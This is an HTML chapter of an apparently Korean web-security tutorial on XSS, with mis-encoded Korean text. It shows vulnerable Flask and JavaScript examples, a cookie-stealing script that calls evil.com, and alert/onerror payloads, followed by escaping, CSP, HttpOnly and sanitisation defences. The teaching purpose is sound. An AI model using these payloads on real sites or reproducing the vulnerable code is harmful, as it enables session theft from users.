<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>4ì¥: XSS ê³µê²©ê³¼ ë°©ì–´ - ë¬¼ë¦¬ì¹˜ë£Œì‚¬ë¥¼ ìœ„í•œ DB 5ê¶Œ</title>
    <link rel="stylesheet" href="../css/style.css">
</head>
<body>
    @@include('components/top-nav.html', {"root": "../..", "activeBook": "5"})

    @@include('components/mobile-menu.html')

    <div class="container">
        <nav class="sidebar" id="sidebar">
            <button class="close-btn" onclick="toggleMenu()">Ã—</button>
            <div class="sidebar-header">
                <h1>ğŸ›¡ï¸ 5ê¶Œ: ë³´ì•ˆ í¸</h1>
                <p>DB & ì„œë²„ ë³´ì•ˆ</p>
            </div>
            <ul class="nav-list" id="navList"></ul>
        </nav>

        <main class="main">
            <h1 class="title">XSS ê³µê²©ê³¼ ë°©ì–´</h1>

            <h2>XSS(Cross-Site Scripting)ë€?</h2>

            <p>ì›¹ í˜ì´ì§€ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•´ì„œ ì‚¬ìš©ì ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ì‹œí‚¤ëŠ” ê³µê²©ì…ë‹ˆë‹¤.</p>

            <blockquote>
                SQL ì¸ì ì…˜ì´ <strong>ì„œë²„/DB</strong>ë¥¼ ê³µê²©í•œë‹¤ë©´,<br>
                XSSëŠ” <strong>ì‚¬ìš©ì ë¸Œë¼ìš°ì €</strong>ë¥¼ ê³µê²©í•©ë‹ˆë‹¤.
            </blockquote>

            <hr>

            <h2>XSS ê³µê²© ìœ í˜•</h2>

            <h3>1. ì €ì¥í˜• XSS (Stored XSS)</h3>
            <p>ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ DBì— ì €ì¥ë˜ì–´ ë‹¤ë¥¸ ì‚¬ìš©ìì—ê²Œ ì „ë‹¬ë©ë‹ˆë‹¤.</p>

            <pre><code># í™˜ì ë©”ëª¨ ì €ì¥ (ì·¨ì•½í•œ ì½”ë“œ)
@app.route('/api/patients/&lt;id&gt;/memo', methods=['POST'])
def save_memo(id):
    memo = request.form.get('memo')
    # ê·¸ëŒ€ë¡œ DBì— ì €ì¥
    cursor.execute("UPDATE patients SET memo = %s WHERE id = %s", (memo, id))

# ê³µê²©ìê°€ ì…ë ¥í•œ ë©”ëª¨:
&lt;script&gt;
    fetch('https://evil.com/steal?cookie=' + document.cookie);
&lt;/script&gt;

# ë‹¤ë¥¸ ì§ì›ì´ í™˜ì ì •ë³´ë¥¼ ë³¼ ë•Œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰!</code></pre>

            <h3>2. ë°˜ì‚¬í˜• XSS (Reflected XSS)</h3>
            <p>URL íŒŒë¼ë¯¸í„°ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë„£ì–´ í”¼í•´ìì—ê²Œ í´ë¦­í•˜ê²Œ í•©ë‹ˆë‹¤.</p>

            <pre><code># ê²€ìƒ‰ ê²°ê³¼ í˜ì´ì§€ (ì·¨ì•½í•œ ì½”ë“œ)
@app.route('/search')
def search():
    query = request.args.get('q')
    return f'&lt;h1&gt;ê²€ìƒ‰ ê²°ê³¼: {query}&lt;/h1&gt;'

# ê³µê²© URL:
/search?q=&lt;script&gt;alert('í•´í‚¹!')&lt;/script&gt;

# í”¼í•´ìê°€ ì´ ë§í¬ë¥¼ í´ë¦­í•˜ë©´ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰!</code></pre>

            <h3>3. DOM ê¸°ë°˜ XSS</h3>
            <p>í´ë¼ì´ì–¸íŠ¸ JavaScriptì—ì„œ ë°œìƒí•˜ëŠ” XSSì…ë‹ˆë‹¤.</p>

            <pre><code>&lt;!-- ì·¨ì•½í•œ JavaScript ì½”ë“œ --&gt;
&lt;script&gt;
    // URL íŒŒë¼ë¯¸í„°ë¥¼ ê·¸ëŒ€ë¡œ HTMLì— ì‚½ì…
    const name = new URLSearchParams(location.search).get('name');
    document.getElementById('greeting').innerHTML = 'ì•ˆë…•í•˜ì„¸ìš”, ' + name + 'ë‹˜!';
&lt;/script&gt;

&lt;!-- ê³µê²© URL --&gt;
/page?name=&lt;img src=x onerror="alert('XSS')"&gt;</code></pre>

            <hr>

            <h2>XSSë¡œ í•  ìˆ˜ ìˆëŠ” ê³µê²©</h2>

            <table>
                <tr>
                    <th>ê³µê²©</th>
                    <th>ì„¤ëª…</th>
                    <th>í”¼í•´</th>
                </tr>
                <tr>
                    <td>ì„¸ì…˜ íƒˆì·¨</td>
                    <td>ì¿ í‚¤ë¥¼ í›”ì³ì„œ ë¡œê·¸ì¸ ìƒíƒœ ë„ìš©</td>
                    <td>ê³„ì • í•´í‚¹</td>
                </tr>
                <tr>
                    <td>í‚¤ë¡œê¹…</td>
                    <td>ì…ë ¥í•˜ëŠ” ëª¨ë“  ë‚´ìš© ê¸°ë¡</td>
                    <td>ë¹„ë°€ë²ˆí˜¸ ìœ ì¶œ</td>
                </tr>
                <tr>
                    <td>í”¼ì‹±</td>
                    <td>ê°€ì§œ ë¡œê·¸ì¸ í¼ í‘œì‹œ</td>
                    <td>ìê²©ì¦ëª… íƒˆì·¨</td>
                </tr>
                <tr>
                    <td>ì•…ì„±ì½”ë“œ ë°°í¬</td>
                    <td>ë“œë¼ì´ë¸Œ ë°”ì´ ë‹¤ìš´ë¡œë“œ</td>
                    <td>PC ê°ì—¼</td>
                </tr>
            </table>

            <hr>

            <h2>ë°©ì–´ 1: ì¶œë ¥ ì´ìŠ¤ì¼€ì´í”„</h2>

            <p>HTML íŠ¹ìˆ˜ë¬¸ìë¥¼ ë³€í™˜í•´ì„œ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì§€ ì•Šê²Œ í•©ë‹ˆë‹¤.</p>

            <pre><code># Flaskì—ì„œ ìë™ ì´ìŠ¤ì¼€ì´í”„ (Jinja2 í…œí”Œë¦¿)
from flask import render_template

@app.route('/patient/&lt;id&gt;')
def show_patient(id):
    patient = get_patient(id)
    # render_templateì€ ìë™ìœ¼ë¡œ ì´ìŠ¤ì¼€ì´í”„í•©ë‹ˆë‹¤
    return render_template('patient.html', patient=patient)

# patient.html
&lt;h1&gt;{{ patient.name }}&lt;/h1&gt;  &lt;!-- ìë™ ì´ìŠ¤ì¼€ì´í”„ë¨ --&gt;
&lt;p&gt;{{ patient.memo }}&lt;/p&gt;   &lt;!-- ìë™ ì´ìŠ¤ì¼€ì´í”„ë¨ --&gt;</code></pre>

            <p>ì´ìŠ¤ì¼€ì´í”„ ë³€í™˜:</p>
            <table>
                <tr>
                    <th>ì›ë³¸</th>
                    <th>ë³€í™˜</th>
                </tr>
                <tr>
                    <td>&lt;</td>
                    <td>&amp;lt;</td>
                </tr>
                <tr>
                    <td>&gt;</td>
                    <td>&amp;gt;</td>
                </tr>
                <tr>
                    <td>&amp;</td>
                    <td>&amp;amp;</td>
                </tr>
                <tr>
                    <td>"</td>
                    <td>&amp;quot;</td>
                </tr>
                <tr>
                    <td>'</td>
                    <td>&amp;#39;</td>
                </tr>
            </table>

            <hr>

            <h2>ë°©ì–´ 2: Content Security Policy (CSP)</h2>

            <p>ë¸Œë¼ìš°ì €ì—ê²Œ í—ˆìš©ëœ ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰í•˜ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤.</p>

            <pre><code># Flaskì—ì„œ CSP í—¤ë” ì„¤ì •
@app.after_request
def add_security_headers(response):
    # ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ ì°¨ë‹¨, ê°™ì€ ë„ë©”ì¸ ìŠ¤í¬ë¦½íŠ¸ë§Œ í—ˆìš©
    response.headers['Content-Security-Policy'] = "script-src 'self'"
    return response</code></pre>

            <p>CSP ì˜µì…˜:</p>
            <pre><code># ê¸°ë³¸ CSP ì„¤ì •
Content-Security-Policy:
    default-src 'self';              # ê¸°ë³¸: ê°™ì€ ë„ë©”ì¸ë§Œ
    script-src 'self';               # ìŠ¤í¬ë¦½íŠ¸: ê°™ì€ ë„ë©”ì¸ë§Œ
    style-src 'self' 'unsafe-inline'; # ìŠ¤íƒ€ì¼: ì¸ë¼ì¸ í—ˆìš©
    img-src 'self' data:;            # ì´ë¯¸ì§€: data URI í—ˆìš©
    connect-src 'self';              # AJAX: ê°™ì€ ë„ë©”ì¸ë§Œ</code></pre>

            <hr>

            <h2>ë°©ì–´ 3: HttpOnly ì¿ í‚¤</h2>

            <p>JavaScriptì—ì„œ ì¿ í‚¤ì— ì ‘ê·¼í•  ìˆ˜ ì—†ê²Œ í•©ë‹ˆë‹¤.</p>

            <pre><code>from flask import Flask, session

app = Flask(__name__)
app.config['SESSION_COOKIE_HTTPONLY'] = True  # JavaScript ì ‘ê·¼ ì°¨ë‹¨
app.config['SESSION_COOKIE_SECURE'] = True    # HTTPSì—ì„œë§Œ ì „ì†¡
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # CSRF ë°©ì–´</code></pre>

            <p>HttpOnlyê°€ ì„¤ì •ë˜ë©´:</p>
            <pre><code># ê³µê²©ìì˜ XSS ìŠ¤í¬ë¦½íŠ¸
document.cookie  // ë¹ˆ ë¬¸ìì—´! ì¿ í‚¤ë¥¼ í›”ì¹  ìˆ˜ ì—†ìŒ</code></pre>

            <hr>

            <h2>ë°©ì–´ 4: ì…ë ¥ ê²€ì¦</h2>

            <pre><code>import re
import bleach  # HTML ì†Œë… ë¼ì´ë¸ŒëŸ¬ë¦¬

def sanitize_input(text):
    """ìœ„í—˜í•œ HTML íƒœê·¸ ì œê±°"""
    # í—ˆìš©í•  íƒœê·¸ë§Œ ì§€ì •
    allowed_tags = ['b', 'i', 'u', 'br']
    return bleach.clean(text, tags=allowed_tags)

def validate_name(name):
    """ì´ë¦„: í•œê¸€, ì˜ë¬¸ë§Œ í—ˆìš©"""
    if not re.match(r'^[ê°€-í£a-zA-Z\s]+$', name):
        raise ValueError('í—ˆìš©ë˜ì§€ ì•ŠëŠ” ë¬¸ìê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤')
    return name

@app.route('/api/patients', methods=['POST'])
def create_patient():
    data = request.get_json()

    # ì…ë ¥ ê²€ì¦
    name = validate_name(data['name'])
    memo = sanitize_input(data.get('memo', ''))

    # ì•ˆì „í•˜ê²Œ ì €ì¥
    ...</code></pre>

            <hr>

            <h2>JavaScriptì—ì„œì˜ ì•ˆì „í•œ ì²˜ë¦¬</h2>

            <pre><code>// âŒ ìœ„í—˜: innerHTML ì‚¬ìš©
document.getElementById('result').innerHTML = userInput;

// âœ… ì•ˆì „: textContent ì‚¬ìš©
document.getElementById('result').textContent = userInput;

// âœ… ì•ˆì „: createElement ì‚¬ìš©
const div = document.createElement('div');
div.textContent = userInput;
document.getElementById('container').appendChild(div);</code></pre>

            <hr>

            <h2>XSS ë°©ì–´ ì²´í¬ë¦¬ìŠ¤íŠ¸</h2>

            <table>
                <tr>
                    <th>í•­ëª©</th>
                    <th>í™•ì¸</th>
                </tr>
                <tr>
                    <td>í…œí”Œë¦¿ ì—”ì§„ì˜ ìë™ ì´ìŠ¤ì¼€ì´í”„ ì‚¬ìš©</td>
                    <td>â˜</td>
                </tr>
                <tr>
                    <td>CSP í—¤ë” ì„¤ì •</td>
                    <td>â˜</td>
                </tr>
                <tr>
                    <td>ì„¸ì…˜ ì¿ í‚¤ HttpOnly ì„¤ì •</td>
                    <td>â˜</td>
                </tr>
                <tr>
                    <td>ì‚¬ìš©ì ì…ë ¥ ê²€ì¦/ì†Œë…</td>
                    <td>â˜</td>
                </tr>
                <tr>
                    <td>innerHTML ëŒ€ì‹  textContent ì‚¬ìš©</td>
                    <td>â˜</td>
                </tr>
            </table>

            <hr>

            <h2>ì´ë²ˆ ì¥ ì •ë¦¬</h2>

            <ul>
                <li><strong>XSS</strong>ëŠ” ì‚¬ìš©ì ë¸Œë¼ìš°ì €ë¥¼ ê³µê²©í•˜ëŠ” ê¸°ë²•</li>
                <li>ì €ì¥í˜•, ë°˜ì‚¬í˜•, DOM ê¸°ë°˜ ì„¸ ê°€ì§€ ìœ í˜•</li>
                <li><strong>ì´ìŠ¤ì¼€ì´í”„</strong>ë¡œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ë°©ì§€</li>
                <li><strong>CSP</strong>ë¡œ í—ˆìš©ëœ ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰</li>
                <li><strong>HttpOnly</strong>ë¡œ ì¿ í‚¤ íƒˆì·¨ ë°©ì§€</li>
            </ul>

            <blockquote>ë‹¤ìŒ ì¥ì—ì„œëŠ” CSRF ê³µê²©ê³¼ ë°©ì–´ë¥¼ ë°°ì›ë‹ˆë‹¤!</blockquote>

            <div class="nav-buttons">
                <button class="nav-btn" id="prevBtn">â† ì´ì „</button>
                <span class="page-num" id="pageNum"></span>
                <button class="nav-btn" id="nextBtn">ë‹¤ìŒ â†’</button>
            </div>
        </main>
    </div>
    <script src="../js/nav.js"></script>
</body>
</html>
